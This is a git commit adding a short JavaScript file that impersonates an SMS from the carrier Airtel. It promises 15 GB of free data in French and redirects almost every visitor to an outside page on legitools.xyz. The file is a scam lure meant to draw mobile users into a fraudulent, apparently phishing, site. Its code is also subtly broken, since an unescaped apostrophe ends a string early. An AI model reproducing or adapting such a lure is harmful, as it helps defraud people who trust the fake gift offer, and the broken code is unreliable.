18b8fa7142cf4ddb3d6f5858a4a00fcb0414b15b
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-12-06 17:30:00 -0800

    Create airtelcadeau.js

---
+++ airtelcadeau.js
@@ -0,0 +1,5 @@
+var password = 'Cadeau de données gratuit de 15Go'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 15 Go de données gratuites et une carte d'appel. Veuillez appuyer sur OK pour ACTIVER. ','15 Go de données gratuites');
+if (password != 'Cadeau de données gratuit de 15 Go') {
+location.href='https://legitools.xyz/airtelcadeau.html';
+}
